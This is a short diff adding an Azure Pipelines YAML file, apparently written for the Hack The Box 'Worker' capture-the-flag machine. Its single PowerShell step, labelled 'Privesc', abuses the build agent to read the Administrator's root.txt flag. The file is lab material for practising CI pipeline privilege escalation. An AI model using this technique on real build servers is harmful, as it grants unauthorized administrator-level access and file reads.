@@ -1,0 +1,16 @@
+# Starter pipeline
+# Start with a minimal pipeline that you can customize to build and deploy your code.
+# Add steps that build, run tests, deploy, and more:
+# https://aka.ms/yaml
+
+# This is for htb Worker Box :)
+
+trigger:
+- master
+
+pool: 'Setup'
+
+steps:
+- powershell: type C:\Users\Administrator\Desktop\root.txt
+  displayName: 'Privesc'
+
